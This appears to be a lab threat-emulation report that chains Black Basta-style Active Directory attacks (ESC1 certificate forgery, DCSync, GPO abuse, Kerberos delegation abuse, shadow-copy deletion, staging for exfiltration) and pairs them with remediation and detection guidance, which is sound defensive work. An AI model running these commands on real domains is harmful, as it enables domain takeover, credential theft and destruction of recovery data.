# Black Basta - Threat Actor Emulation Report

| Field | Detail |
|-------|--------|
| **Classification** | Confidential |
| **Target Environment** | Active Directory - Windows Server 2025 / Windows 11 |
| **Domain** | `corp.local` |
| **Report Status** | Final |
| **Assessment Type** | Threat Actor Emulation - Black Basta |
| **Threat Intel Reference** | CISA Advisory AA24-131A (May 2024) |
| **Attacker Platform** | Exegol (Linux) / Hyper-V Lab |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Objectives](#2-scope--objectives)
3. [Methodology](#3-methodology)
4. [Attack Chain Overview](#4-attack-chain-overview)
5. [Findings](#5-findings)
   - [FIND-01 - AD CS Misconfiguration - ESC1 (Vulnerable Certificate Template)](#find-01---ad-cs-misconfiguration---esc1-vulnerable-certificate-template)
   - [FIND-02 - Credentials Exposed in World-Readable Network Share](#find-02---credentials-exposed-in-world-readable-network-share)
   - [FIND-03 - Constrained Delegation with Protocol Transition - svc_sql](#find-03---constrained-delegation-with-protocol-transition---svc_sql)
   - [FIND-04 - GPO Misconfiguration - Excessive Edit Rights on Workstation Policy](#find-04---gpo-misconfiguration---excessive-edit-rights-on-workstation-policy)
   - [FIND-05 - Full Domain Compromise via DCSync](#find-05---full-domain-compromise-via-dcsync)
6. [Technical Narrative](#6-technical-narrative)
   - [Phase 1 - Initial Access & Reconnaissance](#phase-1---initial-access--reconnaissance)
   - [Phase 2 - AD CS Enumeration & ESC1 Exploitation (Path A)](#phase-2---ad-cs-enumeration--esc1-exploitation-path-a)
   - [Phase 3 - Domain Compromise via DCSync](#phase-3---domain-compromise-via-dcsync)
   - [Phase 4 - GPO Abuse & Lateral Movement (Path B)](#phase-4---gpo-abuse--lateral-movement-path-b)
   - [Phase 5 - Constrained Delegation Abuse](#phase-5---constrained-delegation-abuse)
   - [Phase 6 - Impact Simulation](#phase-6---impact-simulation)
7. [MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
8. [Remediation Summary](#8-remediation-summary)
9. [Appendix](#9-appendix)

---

## 1. Executive Summary

A threat actor emulation exercise was conducted against a simulated corporate Active Directory environment (`corp.local`) modelling the intrusion TTPs of **Black Basta**, as documented in CISA Advisory AA24-131A. The exercise began from an assumed-breach position - a single low-privilege domain account (`t.brown`) representing a phished employee - and resulted in **full domain compromise**.

**Primary attack path (Path A):** A misconfigured Active Directory Certificate Services template allowed any domain user to request a certificate impersonating the Domain Administrator account. This certificate was used to obtain a Kerberos TGT and NTLM hash for the `Administrator` account, followed by a DCSync attack that dumped all domain credentials including the `krbtgt` hash.

**Secondary attack path (Path B):** Three additional independent misconfigurations were identified and validated as viable alternative routes to domain compromise: plaintext credentials in a world-readable SMB share, excessive GPO edit permissions allowing workstation backdooring, and a constrained delegation misconfiguration enabling any-user impersonation against the domain controller.

The combination of these findings represents a **critical exposure** - multiple unrelated paths to domain compromise exist simultaneously, meaning remediation of any single finding does not reduce overall risk to an acceptable level without addressing all identified issues.

**Critical findings:** 1 Critical, 3 High, 1 Medium

---

## 2. Scope & Objectives

### Environment

| Asset | IP | Role |
|---|---|---|
| DC01 | 10.10.10.10 | Domain Controller, AD CS (corp-CA), DNS |
| CLIENT01 | 10.10.10.20 | Windows 11 Workstation (OU=Workstations) |

### Objectives

- Emulate Black Basta intrusion TTPs as documented in CISA AA24-131A
- Identify and exploit AD misconfigurations from a low-privilege initial foothold
- Demonstrate the business impact of credential theft, lateral movement, and ransomware-preparatory actions
- Provide actionable remediation guidance mapped to each finding

### Initial Foothold

| Username | Password | Privilege |
|---|---|---|
| `t.brown` | `<redacted>` | Low - Domain User (Sales OU) |

### Out of Scope

- Physical access
- Social engineering beyond the assumed phished account
- Denial of service

---

## 3. Methodology

The assessment followed a structured kill chain aligned to the MITRE ATT&CK framework and Black Basta TTPs documented in CISA AA24-131A:

```
Reconnaissance → Initial Access → Discovery → Credential Access → Privilege Escalation → Lateral Movement → Impact
```

**Tools used:**

| Tool | Purpose |
|---|---|
| Certipy | AD CS enumeration and ESC1 exploitation |
| BloodHound / bloodhound-python | AD attack path enumeration |
| impacket-GetUserSPNs | SPN / delegation discovery |
| impacket-findDelegation | Delegation configuration enumeration |
| impacket-secretsdump | DCSync / credential dumping |
| NetExec (nxc) | SMB/LDAP authentication, remote execution |
| pyGPOAbuse | GPO modification |
| Rubeus | Kerberos S4U2Self / S4U2Proxy delegation abuse |
| smbclient | SMB share enumeration |
| rpcclient | SID enumeration |

**Note on Windows Server 2025 hardening:** Several standard techniques encountered enforcement controls specific to Server 2025, including mandatory LDAP signing (forcing LDAPS), AES-only Kerberos (RC4 disabled), and Defender-based output interception for remote execution. These are documented where relevant throughout the narrative.

---

## 4. Attack Chain Overview

```
Initial Access (T1078.002)
  └── Phished user: t.brown / <redacted>
        |
Discovery - LOLBins (T1087.002, T1135)
  └── net user /domain, net group "Domain Admins" /domain
  └── smbclient → \\dc01\CorpShare
        → IT-Notes.txt:      svc_sql:<redacted>
        → backup-config.txt: Backup account: svc_backup
        |
        ├── PATH A - AD CS ESC1 (T1649)
        │     └── certipy find → CorpUserV2 flagged vulnerable
        │     └── certipy req → cert with SAN: administrator@corp.local
        │     └── rpcclient → resolve Administrator SID
        │     └── certipy req -sid → cert with embedded SID
        │     └── certipy auth → DA NTLM hash
        │     └── secretsdump → full NTDS dump (DCSync)
        │           → Administrator, krbtgt, all domain hashes
        │
        └── PATH B - GPO Abuse + Constrained Delegation (T1484.001, T1558.003)
              └── pygpoabuse → Workstation-Baseline GPO modified
                    → ScheduledTask adds t.brown to local admins
              └── nxc smb CLIENT01 → t.brown confirmed (admin)
              └── Rubeus uploaded to CLIENT01
              └── S4U2Self + S4U2Proxy → ticket for cifs/dc01.corp.local
                    as Administrator
              |
Impact (T1490, T1048)
  └── vssadmin delete shadows /all /quiet (LOLBin)
  └── robocopy \\dc01\CorpShare C:\exfil /E
        → HR_Salaries.xlsx, IT-Notes.txt, backup-config.txt
```

---

## 5. Findings

---

### FIND-01 - AD CS Misconfiguration - ESC1 (Vulnerable Certificate Template)

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS v3.1 Score** | 9.8 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1649 - Steal or Forge Authentication Certificates |
| **Affected Asset** | DC01 - corp-CA - Template: `CorpUserV2` |

#### Description

The Active Directory Certificate Services template `CorpUserV2` is misconfigured with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled (ESC1). This allows any enrolling user to specify an arbitrary Subject Alternative Name (SAN) in the certificate request, including identities belonging to privileged accounts such as Domain Administrators.

Combined with the following conditions, this results in a complete authentication bypass:

- **Client Authentication EKU** is present - the certificate can be used for Kerberos authentication
- **Domain Users have Enroll rights** - any domain account can request the certificate
- **Manager Approval is disabled** - certificates are issued immediately without review

#### Evidence

Certipy enumeration from `t.brown` (low-privilege domain user):

```
Certificate Templates
  Template Name                       : CorpUserV2
  Enabled                             : True
  Client Authentication               : True
  Enrollee Supplies Subject           : True
  Certificate Authorities             : corp-CA
  Permissions
    Enrollment Permissions
      Enrollment Rights               : CORP.LOCAL\Domain Users
  [!] Vulnerabilities
    ESC1                              : 'CORP.LOCAL\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Certificate requested with arbitrary SAN (`administrator@corp.local`):

```
certipy req -u t.brown@corp.local -p '<redacted>' -ca corp-CA -template CorpUserV2 \
  -upn administrator@corp.local -sid S-1-5-21-2707865489-1470825099-139071591-500 -dc-ip 10.10.10.10

[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

> **Note:** The `-sid` flag was required due to Windows Server 2025 enforcing SID extension validation (KB5014754). The Administrator SID was resolved via `rpcclient` prior to re-requesting the certificate.

Authentication with the forged certificate:

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

[*] Got TGT
[*] Got hash for 'administrator@corp.local': <redacted>
```

#### Business Impact

A low-privilege domain account was used to obtain Domain Administrator credentials without any interaction from a privileged user and without exploiting a software vulnerability. The attack is silent, leaves minimal logs, and can be executed in under two minutes from any domain-joined or network-adjacent host.

#### Remediation

1. **Disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** on the `CorpUserV2` template. Navigate to `certsrv.msc → Certificate Templates → CorpUserV2 → Subject Name tab` and select "Build from Active Directory information" instead of "Supply in the request".
2. **Require Manager Approval** on any template that must retain enrollee-supplied subjects.
3. **Restrict enrollment rights** - remove `Domain Users` and grant enroll permissions only to specific security groups with a legitimate need.
4. **Enable the EDITF_ATTRIBUTESUBJECTALTNAME2 audit flag** on the CA and monitor Event ID 4886 (Certificate Services received a certificate request) and 4887 (Certificate Services approved a certificate request).
5. Run `Invoke-ESC1Check` from the [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) module periodically to detect vulnerable templates.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4886 | Security | Certificate request received - review SAN field for mismatched UPNs |
| 4887 | Security | Certificate issued - alert on certificates issued with UPN not matching requestor |

---

### FIND-02 - Credentials Exposed in World-Readable Network Share

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.1 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1552.001 - Credentials in Files |
| **Affected Asset** | DC01 - `\\dc01\CorpShare` |

#### Description

The network share `\\dc01\CorpShare` is readable by all domain users. The share contains two text files with sensitive operational information: `IT-Notes.txt` exposes plaintext credentials for the `svc_sql` service account, and `backup-config.txt` discloses the existence of the `svc_backup` account. This share was discovered and accessed using the initial low-privilege foothold account `t.brown`.

#### Evidence

Share enumeration as `t.brown`:

```
smbclient //10.10.10.10/CorpShare -U 'corp.local/t.brown%<redacted>' -c "ls"

  backup-config.txt     A   28  Wed Feb 18 14:14:03 2026
  dc01.cer              A  814  Fri Mar  6 14:09:28 2026
  HR_Salaries.xlsx      A   26  Wed Feb 18 14:13:45 2026
  IT-Notes.txt          A   40  Wed Feb 18 14:13:53 2026
```

File contents:

```
cat IT-Notes.txt
svc_sql:<redacted> password rotation scheduled Q4

cat backup-config.txt
Backup account: svc_backup
```

The `svc_sql` credentials recovered here were subsequently used in the constrained delegation attack (FIND-03), and `HR_Salaries.xlsx` was exfiltrated during the impact simulation phase.

#### Business Impact

Plaintext credentials stored in an accessible network location represent a critical operational security failure. Any domain user - including contractors, interns, or a compromised endpoint - can read this share. The `svc_sql` account credentials enabled constrained delegation abuse leading to Domain Admin impersonation.

#### Remediation

1. **Remove plaintext credentials** from all network shares immediately. Use a secrets manager (e.g. HashiCorp Vault, Azure Key Vault) for credential storage.
2. **Audit share permissions** across all domain shares. No share accessible to `Domain Users` should contain sensitive operational data.
3. **Rotate `svc_sql` and `svc_backup` credentials** immediately - both are considered compromised.
4. **Enable share access auditing** - Event ID 5140 (network share object accessed) on the DC.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 5140 | Security | Network share accessed - baseline normal access and alert on anomalous user/share combinations |
| 5145 | Security | File accessed within share - alert on sensitive filenames (*.txt, *.xlsx) accessed by unexpected accounts |

---

### FIND-03 - Constrained Delegation with Protocol Transition - svc_sql

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.8 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1558.003 - Steal or Forge Kerberos Tickets - Kerberoasting / Delegation Abuse |
| **Affected Asset** | DC01 - `svc_sql` service account |

#### Description

The `svc_sql` service account is configured with **Constrained Delegation with Protocol Transition** (`TrustedToAuthForDelegation = True`). This configuration allows `svc_sql` to use the S4U2Self Kerberos extension to obtain a service ticket for **any domain user** - including Domain Administrators - without requiring that user's credentials or an existing Kerberos ticket. The delegation target is `cifs/dc01.corp.local`, pointing directly at the domain controller file share service.

An attacker with knowledge of the `svc_sql` account credentials (obtained via FIND-02) can impersonate the Domain Administrator and gain access to the DC's CIFS service.

#### Evidence

Delegation configuration discovered via `impacket-findDelegation`:

```
AccountName  AccountType  DelegationType                      DelegationRightsTo    SPN Exists
-----------  -----------  ----------------------------------  --------------------  ----------
DC01$        Computer     Unconstrained                       N/A                   Yes
svc_sql      Person       Constrained w/ Protocol Transition  cifs/dc01.corp.local  No
```

SPN identified via Kerberoasting enumeration:

```
GetUserSPNs.py corp.local/t.brown:'<redacted>' -dc-ip 10.10.10.10 -request

ServicePrincipalName           Name     Delegation
-----------------------------  -------  -----------
MSSQLSvc/dc01.corp.local:1433  svc_sql  constrained
```

S4U2Self + S4U2Proxy chain executed via Rubeus from CLIENT01 (after GPO abuse provided local admin access):

```
Rubeus.exe s4u /user:svc_sql /aes256:<redacted> \
  /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /domain:corp.local /dc:10.10.10.10 /ptt

[+] TGT request successful!
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'svc_sql@CORP.LOCAL'
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.corp.local': [...]
[+] Ticket successfully imported!
```

> **Note:** The AES256 key for `svc_sql` was obtained from the DCSync output (FIND-05). RC4 is disabled on Windows Server 2025 by default, and `svc_sql` had `msDS-SupportedEncryptionTypes = 4` (RC4 only) which required updating to AES256 prior to exploitation. In a real engagement this key would be obtained via credential dumping after initial compromise.

#### Business Impact

Protocol Transition delegation removes the requirement for a user to have authenticated to the service first - the service account can fabricate tickets for any identity. With the delegation target pointing at `cifs/dc01.corp.local`, this is a direct path from a single compromised service account to full domain controller access.

#### Remediation

1. **Disable Protocol Transition** - remove `TrustedToAuthForDelegation` from `svc_sql`. Use standard Constrained Delegation (without Protocol Transition) if delegation is genuinely required.
2. **Change the delegation target** - `cifs/dc01.corp.local` is an extremely high-value target. Delegate only to the specific service and host actually required by the application.
3. **Add `svc_sql` to the Protected Users security group** - this prevents delegation abuse entirely for that account.
4. **Replace with a Group Managed Service Account (gMSA)** - gMSAs have auto-rotating 120-character passwords, making credential-based attacks infeasible.
5. **Audit all delegation-enabled accounts** quarterly using `Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}`.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4769 | Security | Kerberos service ticket requested - alert on S4U2Self requests where the ticket-requesting account differs from the subject |
| 4738 | Security | User account changed - alert on modifications to `msDS-AllowedToDelegateTo` or `TrustedToAuthForDelegation` |

---

### FIND-04 - GPO Misconfiguration - Excessive Edit Rights on Workstation Policy

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS v3.1 Score** | 8.4 |
| **CVSS Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **MITRE ATT&CK** | T1484.001 - Domain Policy Modification: Group Policy Object Modification |
| **Affected Asset** | DC01 - GPO: `Workstation-Baseline` |

#### Description

The `IT-Helpdesk` security group has been granted `GpoEditDeleteModifySecurity` permissions on the `Workstation-Baseline` GPO, which is linked to the `OU=Workstations` organisational unit. This permission level grants full edit, delete, and security modification rights over the policy.

Any domain account that is a member of `IT-Helpdesk` - or an account that can add itself to that group - can modify this GPO to deploy arbitrary commands to every workstation in the domain simultaneously. In this exercise, the `helpdesk` account was used to add `t.brown` to the local Administrators group on all workstations.

#### Evidence

GPO permissions verified:

```powershell
Get-GPPermission -Name "Workstation-Baseline" -All | Select Trustee, Permission

Trustee       Permission
-------       ----------
IT-Helpdesk   GpoEditDeleteModifySecurity
```

GPO abused via `pyGPOAbuse` to add `t.brown` to local administrators:

```
pygpoabuse corp.local/helpdesk:'<redacted>' \
  -gpo-id "09deba3b-1124-4fdb-af7a-83973fe0d726" \
  -dc-ip 10.10.10.10 \
  -command "net localgroup administrators t.brown /add" -f

[+] ScheduledTask TASK_cb4cec45 created!
```

Local admin access on CLIENT01 confirmed after GPO application:

```
nxc smb 10.10.10.20 -u t.brown -p '<redacted>' -x "net localgroup administrators"

[+] corp.local\t.brown:<redacted> (admin)
```

#### Business Impact

Group Policy is one of the most powerful administrative mechanisms in Active Directory - a single GPO linked to the Workstations OU can simultaneously affect every workstation in the domain. An attacker with GPO edit rights can deploy malicious scheduled tasks, add backdoor local admin accounts, disable security controls (Defender, firewall), or stage ransomware deployment across all endpoints in a single operation.

#### Remediation

1. **Reduce GPO permissions** for `IT-Helpdesk` to `GpoEdit` only - remove `Delete` and `ModifySecurity` rights.
2. **Implement GPO change approval workflow** - require a second privileged account to approve GPO modifications before they take effect.
3. **Regularly audit GPO permissions** using `Get-GPPermission -All` and alert on any non-admin accounts with edit or higher rights.
4. **Enable GPO change auditing** - Event ID 5136 logs modifications to AD objects including GPO containers.
5. **Consider tiered GPO administration** - only Tier 0 accounts should have rights over GPOs linked to sensitive OUs.

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 5136 | Security | Directory service object modified - alert on modifications to GPO objects in `CN=Policies,CN=System` |
| 4698 | Security | Scheduled task created - alert on tasks created under SYSTEM or machine context outside of approved change windows |

---

### FIND-05 - Full Domain Compromise via DCSync

| Field | Detail |
|---|---|
| **Severity** | Critical (Outcome) |
| **CVSS v3.1 Score** | 9.9 |
| **CVSS Vector** | `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **MITRE ATT&CK** | T1003.006 - OS Credential Dumping: DCSync |
| **Affected Asset** | DC01 - NTDS.dit |

#### Description

Following Domain Administrator credential acquisition via ESC1 (FIND-01), a DCSync attack was executed using `impacket-secretsdump`. DCSync abuses the Directory Replication Service (DRS) protocol to request credential material directly from the domain controller, simulating the behaviour of a legitimate domain controller replicating data. This does not require any code to be executed on the DC itself and produces no standard process or file-based indicators.

All domain credential material was successfully extracted, including the `krbtgt` account hash - enabling Golden Ticket forgery and persistent domain access indefinitely.

#### Evidence

```
secretsdump -hashes <redacted> administrator@10.10.10.10

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<redacted>:::
krbtgt:502:<redacted>:<redacted>:::
it.admin:1101:<redacted>:<redacted>:::
helpdesk:1102:<redacted>:<redacted>:::
j.smith:1103:<redacted>:<redacted>:::
svc_sql:1105:<redacted>:<redacted>:::
svc_backup:1111:<redacted>:<redacted>:::
t.brown:1115:<redacted>:<redacted>:::
[...]
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:<redacted>
Administrator:aes256-cts-hmac-sha1-96:<redacted>
```

13 accounts dumped in full, including all Kerberos keys. The `krbtgt` AES256 key enables offline Golden Ticket creation with configurable lifetime up to 10 years.

#### Business Impact

DCSync represents total and persistent domain compromise. With the `krbtgt` hash an attacker can forge Kerberos tickets for any identity with any privileges, valid for any duration, without touching the domain controller again. Recovery requires a double `krbtgt` password reset (24+ hours apart to allow Kerberos ticket expiry across all DCs) and a full credential rotation for all 13 dumped accounts.

#### Remediation

1. **Remediate FIND-01 (ESC1)** - this finding is a direct consequence of the AD CS misconfiguration. Fixing ESC1 removes the primary path to DA credentials.
2. **Perform emergency credential rotation** for all dumped accounts - prioritise `krbtgt` (double reset, 24h apart), `Administrator`, and all service accounts.
3. **Enable Protected Users group** for all privileged accounts - prevents credential caching and limits delegation abuse.
4. **Implement Tiered Administration** - isolate Tier 0 credentials (DA, krbtgt, CA admins) from Tier 1/2 systems.
5. **Deploy Microsoft Defender for Identity (MDI)** - specifically detects DCSync via suspicious replication requests (alert: "Directory services replication").

#### Detection

| Event ID | Source | Description |
|---|---|---|
| 4662 | Security | Operation performed on AD object - alert on replication GUIDs `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`, `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`, `1131f6a0-9c07-11d1-f79f-00c04fc2dcd2` by non-DC accounts |
| 4929 | Security | AD replica source naming context removed - may indicate DCSync activity |

---

## 6. Technical Narrative

### Phase 1 - Initial Access & Reconnaissance

The exercise began with a single low-privilege domain account, `t.brown`, representing a phished Sales department employee. Initial reconnaissance used native Windows LOLBins to avoid detection and establish domain context:

```
whoami /all
net user /domain
net group "Domain Admins" /domain
```

Network share enumeration identified a world-readable corporate share on the domain controller:

```
smbclient //10.10.10.10/CorpShare -U 'corp.local/t.brown%<redacted>' -c "ls"

  backup-config.txt     A   28
  HR_Salaries.xlsx      A   26
  IT-Notes.txt          A   40
```

The contents of `IT-Notes.txt` disclosed plaintext credentials for the `svc_sql` service account (`<redacted>`), and `backup-config.txt` identified the existence of a `svc_backup` account - both noted for later exploitation.

BloodHound was used to map the full domain attack surface:

```
bloodhound-python -u t.brown -p '<redacted>' -d corp.local -ns 10.10.10.10 -c all

INFO: Found 12 users, 59 groups, 4 GPOs, 7 OUs, 2 computers
```

BloodHound analysis identified three high-value attack paths from `t.brown`: ESC1 via AD CS, GPO edit rights on the Workstation-Baseline policy via `IT-Helpdesk`, and constrained delegation on `svc_sql`.

---

### Phase 2 - AD CS Enumeration & ESC1 Exploitation (Path A)

Certipy was used to enumerate published certificate templates accessible to domain users:

```
certipy find -u t.brown@corp.local -p '<redacted>' -dc-ip 10.10.10.10 -vulnerable
```

The `CorpUserV2` template was flagged as vulnerable to ESC1: `Enrollee Supplies Subject: True`, `Client Authentication: True`, and `Domain Users` had Enroll rights with no manager approval required.

An initial certificate request was made specifying `administrator@corp.local` as the UPN:

```
certipy req -u t.brown@corp.local -p '<redacted>' -ca corp-CA \
  -template CorpUserV2 -upn administrator@corp.local -dc-ip 10.10.10.10
```

Authentication failed due to Windows Server 2025 enforcing SID extension validation (KB5014754) - the certificate lacked a SID extension matching the Administrator account. The Administrator SID was resolved via `rpcclient`:

```
rpcclient -U 't.brown%<redacted>' 10.10.10.10 -c "lookupnames administrator"

administrator S-1-5-21-2707865489-1470825099-139071591-500 (User: 1)
```

The certificate was re-requested with the SID embedded:

```
certipy req -u t.brown@corp.local -p '<redacted>' -ca corp-CA \
  -template CorpUserV2 -upn administrator@corp.local \
  -sid S-1-5-21-2707865489-1470825099-139071591-500 -dc-ip 10.10.10.10

[*] Certificate object SID is 'S-1-5-21-2707865489-1470825099-139071591-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Authentication with the certificate succeeded, returning a TGT and NTLM hash for the Domain Administrator:

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

[*] Got TGT
[*] Got hash for 'administrator@corp.local': <redacted>
```

---

### Phase 3 - Domain Compromise via DCSync

With Domain Administrator credentials in hand, a DCSync attack was executed to dump all domain credential material:

```
secretsdump -hashes <redacted> administrator@10.10.10.10
```

All 13 domain accounts were dumped including the `krbtgt` AES256 key, representing complete and persistent domain compromise. See FIND-05 for the full output.

---

### Phase 4 - GPO Abuse & Lateral Movement (Path B)

In parallel to Path A, the GPO misconfiguration was validated as an independent compromise path. The `helpdesk` account (member of `IT-Helpdesk`) was used to modify the `Workstation-Baseline` GPO and deploy a scheduled task adding `t.brown` to the local Administrators group on all workstations:

```
pygpoabuse corp.local/helpdesk:'<redacted>' \
  -gpo-id "09deba3b-1124-4fdb-af7a-83973fe0d726" \
  -dc-ip 10.10.10.10 \
  -command "net localgroup administrators t.brown /add" -f

[+] ScheduledTask TASK_cb4cec45 created!
```

Following GPO application, `t.brown` was confirmed as local administrator on CLIENT01:

```
nxc smb 10.10.10.20 -u t.brown -p '<redacted>' -x "net localgroup administrators"

[+] corp.local\t.brown:<redacted> (admin)
```

Remote code execution as SYSTEM was confirmed via `atexec`:

```
nxc smb 10.10.10.20 -u t.brown -p '<redacted>' --exec-method atexec -x "whoami"

nt authority\system
```

---

### Phase 5 - Constrained Delegation Abuse

With local admin access on CLIENT01 established via GPO abuse, the constrained delegation misconfiguration on `svc_sql` was exploited. Delegation configuration was first enumerated from Exegol:

```
findDelegation.py corp.local/t.brown:'<redacted>' -dc-ip 10.10.10.10

AccountName  DelegationType                      DelegationRightsTo
-----------  ----------------------------------  --------------------
svc_sql      Constrained w/ Protocol Transition  cifs/dc01.corp.local
```

Rubeus was uploaded to CLIENT01 and the full S4U2Self → S4U2Proxy chain was executed to obtain a Kerberos service ticket for `cifs/dc01.corp.local` impersonating the Domain Administrator:

```
Rubeus.exe s4u /user:svc_sql \
  /aes256:<redacted> \
  /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local \
  /domain:corp.local /dc:10.10.10.10 /ptt

[+] TGT request successful!
[+] S4U2self success!
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

The ticket for `cifs/dc01.corp.local` as `Administrator` was successfully obtained and injected into the current session, demonstrating a viable independent path to domain controller access from a compromised service account.

---

### Phase 6 - Impact Simulation

To simulate Black Basta's post-compromise impact phase, two actions were executed using the Domain Administrator hash:

**Shadow Copy deletion** (inhibit system recovery):

```
nxc smb 10.10.10.10 -u administrator -H <redacted> \
  --exec-method atexec -x "vssadmin delete shadows /all /quiet"

[+] Executed command via atexec
```

**Data exfiltration simulation** (robocopy LOLBin):

```
nxc smb 10.10.10.10 -u administrator -H <redacted> \
  --exec-method atexec -x "robocopy \\\\dc01\\CorpShare C:\\exfil /E"

[+] Executed command via atexec
```

Files staged for exfiltration: `HR_Salaries.xlsx`, `IT-Notes.txt`, `backup-config.txt`.

Both commands executed successfully. Output retrieval was blocked by Windows Defender on Server 2025, consistent with Black Basta's observed behaviour of operating in environments with endpoint protection - the commands ran but artefact retrieval required additional evasion in a real engagement.

---

## 7. MITRE ATT&CK Mapping

| TTP | Technique ID | Tool / Method | Finding |
|---|---|---|---|
| Valid Accounts - Domain | T1078.002 | `t.brown` initial foothold | - |
| Account Discovery | T1087.002 | `net user`, `net group` (LOLBin) | - |
| Network Share Discovery | T1135 | `smbclient` | FIND-02 |
| Credentials in Files | T1552.001 | `IT-Notes.txt` - plaintext creds | FIND-02 |
| Steal or Forge Certificates - ESC1 | T1649 | Certipy | FIND-01 |
| Kerberos Delegation Abuse | T1558.003 | Rubeus S4U2Proxy | FIND-03 |
| Group Policy Modification | T1484.001 | pyGPOAbuse | FIND-04 |
| Pass-the-Hash | T1550.002 | NetExec | FIND-05 |
| OS Credential Dumping - DCSync | T1003.006 | impacket-secretsdump | FIND-05 |
| Inhibit System Recovery | T1490 | `vssadmin delete shadows` (LOLBin) | - |
| Exfiltration over SMB | T1048 | `robocopy` (LOLBin) | - |

---

## 8. Remediation Summary

| Finding | Severity | CVSS | Priority Action |
|---|---|---|---|
| FIND-01 - ESC1 Vulnerable Template | Critical | 9.8 | Disable enrollee-supplied subject on `CorpUserV2`; restrict enrollment rights |
| FIND-02 - Credentials in Share | High | 8.1 | Remove plaintext credentials; audit all share contents; rotate `svc_sql` |
| FIND-03 - Constrained Delegation | High | 8.8 | Remove Protocol Transition; replace `svc_sql` with gMSA |
| FIND-04 - GPO Excessive Rights | High | 8.4 | Reduce `IT-Helpdesk` GPO rights to `GpoEdit`; enable GPO change auditing |
| FIND-05 - DCSync / Domain Compromise | Critical | 9.9 | Double-reset `krbtgt`; rotate all 13 dumped account passwords |

**Immediate actions (within 24 hours):**
- Disable `CorpUserV2` certificate template
- Rotate `krbtgt` (first reset)
- Rotate `Administrator`, `svc_sql`, `svc_backup`, `helpdesk` passwords
- Remove plaintext credentials from `CorpShare`

**Short-term (within 7 days):**
- Second `krbtgt` reset (24h+ after first)
- Fix ESC1 template configuration
- Remove Protocol Transition from `svc_sql` delegation
- Reduce GPO permissions for `IT-Helpdesk`

**Medium-term (within 30 days):**
- Deploy MDI for ongoing DCSync and delegation abuse detection
- Implement tiered administration model
- Enrol all privileged accounts in Protected Users group
- Replace `svc_sql` with a gMSA

---

## 9. Appendix

### A. Credentials Reference (Lab Only)

| Username | NT Hash | Notes |
|---|---|---|
| Administrator | `<redacted>` | Domain Admin - obtained via ESC1 |
| krbtgt | `<redacted>` | Golden Ticket capability |
| svc_sql | `<redacted>` | Delegation abuse |
| svc_backup | `<redacted>` | Backup Operators |

### B. Domain SIDs

| Account | SID |
|---|---|
| Administrator | `S-1-5-21-2707865489-1470825099-139071591-500` |
| Domain | `S-1-5-21-2707865489-1470825099-139071591` |

### C. Windows Server 2025 Hardening Observations

| Issue | Cause | Impact on Attack |
|---|---|---|
| LDAP signing enforced | Server 2025 default | Forced LDAPS for all LDAP tool calls |
| RC4 Kerberos disabled | Server 2025 default (AES-only) | Kerberoasting and impacket getST failed without AES key |
| SID extension enforcement (KB5014754) | AD CS patch | Initial ESC1 auth failed - required re-request with `-sid` flag |
| Defender output interception | Real-time protection | Remote exec commands ran but output files were quarantined - required alternative exec methods |
| `msDS-SupportedEncryptionTypes = 4` on svc_sql | RC4-only account config | S4U delegation failed until account updated to AES256 |

### D. GPO Details

| GPO Name | ID | Linked OU |
|---|---|---|
| Workstation-Baseline | `09deba3b-1124-4fdb-af7a-83973fe0d726` | OU=Workstations,DC=corp,DC=local |
| LAPS-Workstations | _(see lab setup)_ | OU=Workstations,DC=corp,DC=local |

### E. References

- CISA Advisory AA24-131A - Black Basta: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a
- SpecterOps - Certified Pre-Owned (ESC1–ESC8): https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- Certipy by Oliver Lyak: https://github.com/ly4k/Certipy
- Impacket by Fortra: https://github.com/fortra/impacket
- PyGPOAbuse: https://github.com/Hackndo/pyGPOAbuse
- Rubeus by GhostPack: https://github.com/GhostPack/Rubeus
- Microsoft KB5014754 - Certificate-based authentication changes: https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16

---

